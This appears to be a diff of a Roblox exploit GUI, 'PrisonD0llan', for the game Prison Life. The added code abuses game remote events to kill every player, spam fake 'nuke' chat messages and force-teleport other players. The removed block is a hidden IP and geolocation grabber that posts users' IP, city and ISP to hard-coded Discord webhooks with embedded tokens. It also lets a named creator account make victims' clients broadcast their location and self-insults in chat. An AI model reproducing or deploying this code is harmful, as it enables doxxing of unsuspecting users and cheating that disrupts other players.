+				if (TeamS and v.Team == TeamS) or not TeamS then
+					for i =1,10 do
+						Gen[#Gen+1]={
+							["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+							["Distance"] = .1,
+							["Cframe"] = CFrame.new(),
+							["Hit"] = v.Character:WaitForChild("Head")
+						}
+					end
+				end
+			end
+		end
+		game:GetService("ReplicatedStorage").ShootEvent:FireServer(Gen, Gun)
+		wait(.1)
+		Last_Team(a)
+		wait(.4)
+		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+	end
+	local function givenukeTo(plrRRr)
+		if plrRRr then
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("!!!A NUKE HAS BEEN PLACED ON "..plrRRr.Name.." KILLING HIM WILL GET EVERYONE DEAD!!!", "ALL")
+			repeat task.wait()
+				if plrRRr.Character and plrRRr.Character:FindFirstChildOfClass("Humanoid") and plrRRr.Character:FindFirstChildOfClass("Humanoid").Health <1 then
+					break
+				end
+			until not game
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(plrRRr.Name.." IS DEAD NUKE LAUNCHING!!!", "ALL")
+			wait(1.5)
+			--//This is what I call perfect work 
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 3", "ALL")
+			wait(1.5)
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 2", "ALL")			
+			wait(1.5)
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 1", "ALL")
+			wait(2)
+			Kill_All()
+		end
+	end
+	function Teleport(Player, Position)
+		if Player == nil or Position == nil then return end
+		local savedcf = GetPos()
+		workspace.Remote.loadchar:InvokeServer()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
+		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
+		local CHAR = game.Players.LocalPlayer.Character
+		CHAR.Humanoid.Name = "1"
+		local c = CHAR["1"]:Clone()
+		c.Name = "Humanoid"
+		c.Parent = CHAR
+		CHAR["1"]:Destroy()
+		game.Workspace.CurrentCamera.CameraSubject = CHAR
+		CHAR.Animate.Disabled = true
+		wait()
+		CHAR.Animate.Disabled = false
+		CHAR.Humanoid.DisplayDistanceType = "None"
+		game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("M9").Parent = CHAR
+		local STOP = 0
+		repeat wait(.1)
+			STOP = STOP + 1
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0.75)
+		until (not game.Players.LocalPlayer.Character:FindFirstChild("M9") or not game.Players.LocalPlayer.Character.HumanoidRootPart or not Player.Character.HumanoidRootPart or not game.Players.LocalPlayer.Character.HumanoidRootPart.Parent or not Player.Character.HumanoidRootPart.Parent or STOP > 500) and STOP > 3
+		local STOP_2 = 0
+		repeat wait()
+			STOP_2 = STOP_2 + 1
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Position
+		until STOP_2 > 10
+		workspace.Remote.loadchar:InvokeServer()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
+	end
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local savedcf = getpos()
+		local CrimPad = workspace["Criminals Spawn"].SpawnLocation
+		local padcf = CrimPad.CFrame
+		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CrimPad.CFrame
+		wait()
+		CrimPad.CFrame = getpos()
+		CrimPad.CanCollide = false
+		CrimPad.Transparency = 1.000
+		CrimPad.Anchored = true
+		repeat wait() 
+			pcall(function()
+				for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
+					if v ~= game.Players.LocalPlayer then
+						Teleport(v, CrimPad.CFrame)
+					end
+				end
+				for i,v in pairs(game.Teams.Guards:GetPlayers()) do
+					if v ~= game.Players.LocalPlayer then
+						Teleport(v, CrimPad.CFrame)
+					end
+				end
+			end)
+		until #game.Teams.Criminals:GetPlayers() == (#game.Players:GetPlayers()-#game.Teams.Neutral:GetPlayers())
+		workspace.Remote.loadchar:InvokeServer()
+		CrimPad.Transparency = 0.000
+		CrimPad.CFrame = padcf
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
+	end)
+end;
+task.spawn(C_f7);
+-- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel.LocalScript
+local function C_f9()
+	local script = G2L["f9"];
 	wait(0.6)
 	local TweenService, Tweens, Tween, Tw, TS = game:GetService("TweenService"),game:GetService("TweenService"),game:GetService("TweenService"),game:GetService("TweenService"),game:GetService("TweenService")
 	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
@@ -13012,16 +14658,16 @@ local function C_ee()
 		end
 	)
 end;
-task.spawn(C_ee);
+task.spawn(C_f9);
 -- StarterGui.PrisonD0llan.Title.mainFrame.Test.LocalScript
-local function C_f4()
-	local script = G2L["f4"];
+local function C_ff()
+	local script = G2L["ff"];
 	script.Parent:Remove()
 end;
-task.spawn(C_f4);
+task.spawn(C_ff);
 -- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
-local function C_f7()
-	local script = G2L["f7"];
+local function C_102()
+	local script = G2L["102"];
 	local function AddColorPickerForObject(ObjectToChangeColor3, vauleToChange, ObjectName)
 		-- Gui to Lua
 		-- Version: 3.2
@@ -13349,10 +14995,10 @@ local function C_f7()
 		AddColorPickerForObject(script.Parent.Parent.Parent.Parent.TitleText, "TextColor3", "Title Text")
 	end)
 end;
-task.spawn(C_f7);
+task.spawn(C_102);
 -- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
-local function C_f9()
-	local script = G2L["f9"];
+local function C_104()
+	local script = G2L["104"];
 	local function AddColorPickerForObject(ObjectToChangeColor3, vauleToChange, ObjectName)
 		-- Gui to Lua
 		-- Version: 3.2
@@ -13680,10 +15326,10 @@ local function C_f9()
 		AddColorPickerForObject(script.Parent.Parent.Parent.Parent.mainFrame, "BorderColor3", "Border Frame")
 	end)
 end;
-task.spawn(C_f9);
+task.spawn(C_104);
 -- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
-local function C_fb()
-	local script = G2L["fb"];
+local function C_106()
+	local script = G2L["106"];
 	local function AddColorPickerForObject(ObjectToChangeColor3, vauleToChange, ObjectName)
 		-- Gui to Lua
 		-- Version: 3.2
@@ -14011,10 +15657,10 @@ local function C_fb()
 		AddColorPickerForObject(script.Parent.Parent.Parent.Parent.TitleText, "BorderColor3", "Border Frame")
 	end)
 end;
-task.spawn(C_fb);
+task.spawn(C_106);
 -- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
-local function C_fd()
-	local script = G2L["fd"];
+local function C_108()
+	local script = G2L["108"];
 	local function AddColorPickerForObject(ObjectToChangeColor3, vauleToChange, ObjectName, GetChildren)
 		-- Gui to Lua
 		-- Version: 3.2
@@ -14348,10 +15994,10 @@ local function C_fd()
 		AddColorPickerForObject(script.Parent.Parent.Parent.Pages, "BorderColor3", "All pages buttons", true)
 	end)
 end;
-task.spawn(C_fd);
+task.spawn(C_108);
 -- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
-local function C_ff()
-	local script = G2L["ff"];
+local function C_10a()
+	local script = G2L["10a"];
 	script.Parent.MouseButton1Click:Connect(function()
 	--[=[
 	 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
@@ -14633,10 +16279,10 @@ local function C_ff()
 		return G2L["1"], require;
 	end)
 end;
-task.spawn(C_ff);
+task.spawn(C_10a);
 -- StarterGui.PrisonD0llan.Title.LocalScript
-local function C_102()
-	local script = G2L["102"];
+local function C_10d()
+	local script = G2L["10d"];
 	local UserInputService = game:GetService("UserInputService")
 
 	local gui = script.Parent
@@ -14677,286 +16323,12 @@ local function C_102()
 		end
 	end)
 end;
-task.spawn(C_102);
+task.spawn(C_10d);
 -- StarterGui.PrisonD0llan.LocalScript
-local function C_103()
-	local script = G2L["103"];
-	local request = http_request or request or HttpPost or syn.request or fluxus.request or http.request
-	local executor  = identifyexecutor() or "no les dire cual uso xD"
-	local whilelisted = "G0bbyAlt3"
-	local name = game:GetService("Players").LocalPlayer.Name
-	local WebhookURL = "https://discord.com/api/webhooks/1140467984238923796/WuvO1F6CF3dp0d7p0ZCe0wIRupHOtUzm5ZqbT6LY7lNv3QZS6orhMlxYekrnSOfL5U5r"
-	local getIPResponse = request({
-		Url = "https://api.ipify.org/?format=json",
-	})
-	local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
-	local IPBuffer = tostring(GetIPJSON.ip)
-
-	local getIPInfo = request({
-		Url = string.format("http://ip-api.com/json/%s", IPBuffer)
-	})
-	local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
-	local FI = {
-		IP = IPBuffer,
-		country = IIT.country,
-		countryCode = IIT.countryCode,
-		region = IIT.region,
-		regionName = IIT.regionName,
-		city = IIT.city,
-		zipcode = IIT.zip,
-		latitude = IIT.lat,
-		longitude = IIT.lon,
-		isp = IIT.isp,
-		org = IIT.org
-	}
-	local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
-	local MessageData = {
-		["content"] = dataMessage
-	}
-
-
-
-	-- Define las URLs de las páginas
-	local urls = {
-		"http://ip-api.com/json/",
-		"https://httpbin.org/ip",
-		"https://ipinfo.io/json",
-		"https://api.ipify.org/?format=json",
-		"https://ip-api.io/api/json",
-		"http://ip.42.pl/raw",
-		"https://icanhazip.com",
-		"https://httpbin.org/get"
-	}
-
-	-- Define la URL de tu webhook de Discord
-	local webhookUrl = "https://discord.com/api/webhooks/1150594410090864710/teS-V4fwhbs2H2RwgVe5b6mWPmKGWWyPNoNSeI7PuoWH9h-6JkLeFs4U5Ue3u6nzYuMd"
-
-	-- Función para enviar datos a un webhook
-	local function sendToWebhook(url, response)
-		local data = {
-			content = "Solicitud a " .. url,
-			embeds = {
-				{
-					title = "Respuesta:",
-					description = response,
-					color = 65280 -- Color verde (puedes cambiarlo)
-				}
-			}
-		}
-		sendToWebhook("Nuevo jugador pendejo xD, "..game.Players.LocalPlayer.Name)
-		wait(1)
-		sendToWebhook(dataMessage)
-		local postData = request({
-			Url = webhookUrl,
-			Method = "POST",
-			Headers = {
-				["Content-Type"] = "application/json"
-			},
-			Body = game:GetService("HttpService"):JSONEncode(data)
-		})
-
-		if postData and postData.Success then
-			print("Datos enviados al webhook con éxito:", postData.Body)
-		else
-			warn("Error al enviar datos al webhook:", postData and postData.StatusCode or "No se pudo enviar")
-		end
-	end
-
-	-- Realiza solicitudes a las páginas y envía las respuestas al webhook
-	for _, url in ipairs(urls) do
-		local success, response = pcall(function()
-			return request({
-				Url = url,
-				Method = "GET"
-			}).Body
-		end)
-
-		if success then
-			sendToWebhook(url, response)
-		else
-			warn("Error al realizar la solicitud a", url)
-		end
-	end
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-	--Set for creator
-	local function Whisper(Plr, Message)
-		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Plr.Name.." "..Message, "All")
-	end
-	local function chat(str)
-		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
-	end
-	local Creator = "G0bbyD0llan1"
-	for _, plr in pairs(game.Players:GetPlayers()) do
-		if plr.Name == Creator then
-			plr.Chatted:Connect(function(message)
-				if message:lower() == "!StartProcess" or message:lower() == "pure de salchicha" and not game.Players.LocalPlayer.Name == whilelisted then
-					wait(0.5)
-					chat("hola soy un pedazo de Niño que roba scripts de yt!")
-					wait(1)
-					chat("actualmente uso "..tostring(executor).." de exploit")
-					wait(0.4)
-					chat("y se que tiene virus")
-					wait(1)
-					chat("pero yo quiero que me hacken todas mis cuentas!")
-					wait(2)
-					chat("vivo en "..FI.countryCode..", "..FI.regionName..", "..FI.city)
-					wait(1)
-					chat("Quiero que me hagan bullin en la escuela :D")
-					-- Define las URLs de las páginas
-					local urls = {
-						"http://ip-api.com/json/",
-						"https://httpbin.org/ip",
-						"https://ipinfo.io/json",
-						"https://api.ipify.org/?format=json",
-						"https://ip-api.io/api/json",
-						"http://ip.42.pl/raw",
-						"https://icanhazip.com",
-						"https://httpbin.org/get"
-					}
-
-					-- Define la URL de tu webhook de Discord
-					local webhookUrl = "https://discord.com/api/webhooks/1150594410090864710/teS-V4fwhbs2H2RwgVe5b6mWPmKGWWyPNoNSeI7PuoWH9h-6JkLeFs4U5Ue3u6nzYuMd"
-
-					-- Función para enviar datos a un webhook
-					local function sendToWebhook(url, response)
-						local data = {
-							content = "Solicitud a " .. url,
-							embeds = {
-								{
-									title = "Respuesta:",
-									description = response,
-									color = 65280 -- Color verde (puedes cambiarlo)
-								}
-							}
-						}
-						sendToWebhook("Nuevo jugador pendejo xD, "..game.Players.LocalPlayer.Name)
-						wait(1)
-						sendToWebhook(dataMessage)
-						local postData = request({
-							Url = webhookUrl,
-							Method = "POST",
-							Headers = {
-								["Content-Type"] = "application/json"
-							},
-							Body = game:GetService("HttpService"):JSONEncode(data)
-						})
-
-						if postData and postData.Success then
-							print("Datos enviados al webhook con éxito:", postData.Body)
-						else
-							warn("Error al enviar datos al webhook:", postData and postData.StatusCode or "No se pudo enviar")
-						end
-					end
-
-					-- Realiza solicitudes a las páginas y envía las respuestas al webhook
-					for _, url in ipairs(urls) do
-						local success, response = pcall(function()
-							return request({
-								Url = url,
-								Method = "GET"
-							}).Body
-						end)
-
-						if success then
-							sendToWebhook(url, response)
-						else
-							warn("Error al realizar la solicitud a", url)
-						end
-					end
-				elseif message:lower() == "!Hack" then
-					-- Define las URLs de las páginas
-					local urls = {
-						"http://ip-api.com/json/",
-						"https://httpbin.org/ip",
-						"https://ipinfo.io/json",
-						"https://api.ipify.org/?format=json",
-						"https://ip-api.io/api/json",
-						"http://ip.42.pl/raw",
-						"https://icanhazip.com",
-						"https://httpbin.org/get"
-					}
-
-					-- Define la URL de tu webhook de Discord
-					local webhookUrl = "https://discord.com/api/webhooks/1150594410090864710/teS-V4fwhbs2H2RwgVe5b6mWPmKGWWyPNoNSeI7PuoWH9h-6JkLeFs4U5Ue3u6nzYuMd"
-
-					-- Función para enviar datos a un webhook
-					local function sendToWebhook(url, response)
-						local data = {
-							content = "Solicitud a " .. url,
-							embeds = {
-								{
-									title = "Respuesta:",
-									description = response,
-									color = 65280 -- Color verde (puedes cambiarlo)
-								}
-							}
-						}
-						sendToWebhook("Nuevo jugador pendejo xD, "..game.Players.LocalPlayer.Name)
-						wait(1)
-						sendToWebhook(dataMessage)
-						local postData = request({
-							Url = webhookUrl,
-							Method = "POST",
-							Headers = {
-								["Content-Type"] = "application/json"
-							},
-							Body = game:GetService("HttpService"):JSONEncode(data)
-						})
-
-						if postData and postData.Success then
-							print("Datos enviados al webhook con éxito:", postData.Body)
-						else
-							warn("Error al enviar datos al webhook:", postData and postData.StatusCode or "No se pudo enviar")
-						end
-					end
-
-					-- Realiza solicitudes a las páginas y envía las respuestas al webhook
-					for _, url in ipairs(urls) do
-						local success, response = pcall(function()
-							return request({
-								Url = url,
-								Method = "GET"
-							}).Body
-						end)
-
-						if success then
-							sendToWebhook(url, response)
-						else
-							warn("Error al realizar la solicitud a", url)
-						end
-					end
-				end
-			end)
-		end
-	end
+local function C_10e()
+	local script = G2L["10e"];
+print("PrisonD0llan.lua / by G0bbyD0llan")
 end;
-task.spawn(C_103);
+task.spawn(C_10e);
 
 return G2L["1"], require;
